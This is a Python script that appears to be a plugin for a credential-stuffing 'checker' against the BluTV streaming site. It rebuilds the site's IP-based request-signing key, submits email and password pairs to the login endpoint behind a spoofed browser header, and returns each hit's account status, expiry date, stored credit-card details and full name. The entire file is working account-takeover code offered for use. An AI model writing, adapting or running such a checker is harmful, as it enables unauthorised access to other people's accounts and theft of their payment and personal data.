import requests
import time
import json
import hashlib
import base64

firstlogin = True
dontRun = False
waitingInit = True
s = requests.session()
key = ""

def loadForm():
	global s
	global dontRun
	global key
	try:
		ip = requests.get("https://ipinfo.io/json").text.split('"ip": "')[1].split('"')[0]
		plainkey = "1999999999/actions/account/login"+ip+" secret"
		md5key = hashlib.md5(plainkey.encode("utf-8")).digest()
		key = base64.b64encode(md5key).decode("utf-8").replace("=","").replace("/","_").replace("+","-")
	except:
		raise Exception("Couldnt get your IP, please run the script again")
		dontRun = True

def tryLogin(data, proxy):
	global key
	global firstlogin
	global s
	global waitingInit
	if firstlogin:
		firstlogin = False
		loadForm()
		waitingInit = False

	while waitingInit:
		time.sleep(0.3)

	if dontRun:
		time.sleep(0.5)
		raise Exception

	email, password = data

	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
	    'Accept': 'application/json, text/html, text/javascript',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Content-Encoding': 'gzip',
	    'Referer': 'https://www.blutv.com.tr/int/giris',
	    'Connection': 'keep-alive',
	}

	params = (
	    ('key', key),
	    ('expires', '1999999999'),
	)

	data = {
	  'password': password,
	  'platform': 'com.blu.lama',
	  'remember': 'true',
	  'segment': 'default',
	  'username': email,
	  'usetoken': 'true'
	}

	response = requests.post('https://www.blutv.com.tr/actions/account/login', headers=headers, params=params, data=data)
	response = json.loads(response.text)
	if response['status'] == "ok":
		user = response['user']
		return (True,"Status: "+user['AccountState']+" - Expires at: " + user['ExpireDate'] + " - Card: {} {} - Name: {} {}".format(user['CreditCard'],user['CreditCardDate'],user['FirstName'],user['LastName']))
	else:
		return (False,)
